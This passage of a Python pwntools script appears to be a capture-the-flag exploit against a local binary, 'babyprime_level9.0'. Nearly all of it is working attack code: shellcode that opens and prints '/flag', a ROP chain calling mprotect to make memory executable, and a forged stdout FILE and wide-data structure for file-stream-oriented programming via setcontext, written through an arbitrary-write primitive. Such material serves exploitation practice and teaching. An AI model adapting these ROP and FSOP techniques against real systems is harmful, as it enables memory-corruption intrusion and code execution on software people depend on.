		shellcode_addr = (leak << 12) + 0x2000 # rop chain
		fake_wide_data_addr = ((leak & ~0xff) << 12) + 0x1000 # fsop 
		_IO_2_1_stdout_ = ((leak & ~0xff) << 12) + 0xd50 # fsop 
		setcontext = libc_base + 0x539e0 + 61 # fsop
		
		
		
		context.arch = 'amd64'
		
		print("!!!!! MPROTECT + SHELLCODE !!!!!!")
		
		shellcode = asm('''
		    /* Open the file */
		    push 257
		    pop rax
		    mov rdi, -100       /* dirfd: AT_FDCWD */
		    lea rsi, [rip+flag]
		    xor edx, edx        /* flags: O_RDONLY */
		    syscall

		    /* Read and write in one step */
		    push rax
		    pop rdi
		    xor eax, eax        /* syscall: read */
		    sub rsp, 64         /* smaller buffer */
		    mov rsi, rsp        /* buffer address */
		    mov rdx, 64         /* buffer size */
		    syscall
		    
		    /* Write to stdout */
		    push rax
		    pop rdx
		    mov rax, 1          /* syscall: write */
		    mov rdi, 1          /* fd: stdout */
		    /* rsi already points to our buffer */
		    syscall

		flag:
		    .string "/flag" 

		''')
			
		
		print("shellcode address: ", hex(shellcode_addr))
		
		# mprotect(shellcode_addr, 0x1000, 7)
		rop_chain = b""          
		rop_chain += p64(shellcode_addr)   # region of the shellcode addr and rop chain 
		rop_chain += p64(pop_rsi)            
		rop_chain += p64(0x1000)            
		rop_chain += p64(pop_rdx)          
		rop_chain += p64(7)                 # rwx 
		rop_chain += p64(mprotect_addr)     # jump to mprotect in libc
		payload = rop_chain + p64(shellcode_addr + len(rop_chain) + 8) + shellcode # jump to our shellcode	
		
		
		fake_wide_data = b'\x00' * 0x20
		fake_wide_data += p64(random_pointer)
		fake_wide_data += b'\x00' * 0x40
		fake_wide_data += p64(setcontext) #0x68
		fake_wide_data += p64(0) # 0x70
		fake_wide_data += p64(0) # 0x78
		fake_wide_data += p64(0) # 0x79
		fake_wide_data += p64(0) # 0x80
		fake_wide_data += p64(0) # 0x90
		fake_wide_data += p64(0) # 0x98
		fake_wide_data += p64(shellcode_addr) # 0xa0
		fake_wide_data += p64(pop_rdi) # 0xa8
		fake_wide_data += p64(0) # 0xb0
		fake_wide_data += p64(0) # 0xb8
		fake_wide_data += p64(0) # 0xc0
		fake_wide_data += p64(0) # 0xc8
		fake_wide_data += p64(0) # 0xd0
		fake_wide_data += p64(0) # 0xd8	
		fake_wide_data += p64(fake_wide_data_addr)
		
		
		fsop_payload = b'\x00' * 0x78
		fsop_payload += p64(0) # 0x78
		fsop_payload += p64(0) # 0x80
		fsop_payload += p64(random_pointer - 8)  # 88
		fsop_payload += b'\x41' * 0x10  
		fsop_payload += p64(fake_wide_data_addr)  
		# setting up rsp
		fsop_payload += b'\x41' * 0x8
		fsop_payload += p64(shellcode_addr)# rsp would be set to this
		fsop_payload += p64(pop_rdi) # rcx would be set to this
		fsop_payload += p64(0xffffffffffffffff) 
		fsop_payload += b'\x41' * 0x8
		fsop_payload += b'\x41' * 0x8
		fsop_payload += p64(contains_IO_wfile_overflow - 0x38) #0xd8
		
		badchars = b"\x09\x0a\x0b\x0c\x0d\x0e\x20"

		print(f"Checking bad chars (whitespaces)")
		if any(bad in shellcode for bad in badchars):
			print("WARNING: Shellcode contains bad characters!")
			print(f"Shellcode hex: {shellcode.hex()}")
			
		if any(bad in payload for bad in badchars):
			print("WARNING: ROP payload contains bad characters!")
			print(f"Payload hex: {payload.hex()}")

		if any(bad in fake_wide_data for bad in badchars):
			print("WARNING: fake_wide_data contains bad characters!")
			print(f"fake_wide_data hex: {fake_wide_data.hex()}")
			
		if any(bad in fsop_payload for bad in badchars):
			print("WARNING: fsop_payload contains bad characters!")
			print(f"fsop_payload hex: {fsop_payload.hex()}")
		
		arbitrary_write(r1, r2, shellcode_addr, leak, payload, 0, p, s)
		
		arbitrary_write(r1, r2, fake_wide_data_addr, leak, fake_wide_data, 0, p, s)
		
		arbitrary_write(r1, r2, _IO_2_1_stdout_, leak, fsop_payload, 0, p, s)
		
		gdb.attach(p, s)
		pause()
		r1.sendline(b"send_flag w")	
		r1.interactive()	
		
		
		try:
			r1.clean()
			r2.clean()
			p.clean()

			r1.sendline(b"send_flag w")

			response = p.recvall(timeout=2)
			print(response)
		except Exception as e:
			print(f"Final command execution failed: {e}")	
		
		return True
	else:
		print("Failed to leak")
		return False
	
def main(): 
	attempt = 0 
	while True:
		print(f"\nAttempt {attempt + 1}")
		
		global idx 
		idx = 2
		
		try: # code that might fail 
			binary = './babyprime_level9.0'
			p = process(binary)
			r1 = remote("localhost", 1337, timeout = 1)
			r2 = remote("localhost", 1337, timeout = 1)

			if exploit(r1, r2, p):
				break 
		except Exception as e: # what does the program do when `try` fails
			print(f"Error in attempt {attempt + 1}: {e}")
		finally: # code that always run no matter what
			try:
				r1.close()
				r2.close()
				p.kill()
			except:
				pass
		attempt += 1
	

if __name__ == "__main__":
	main()
	
```













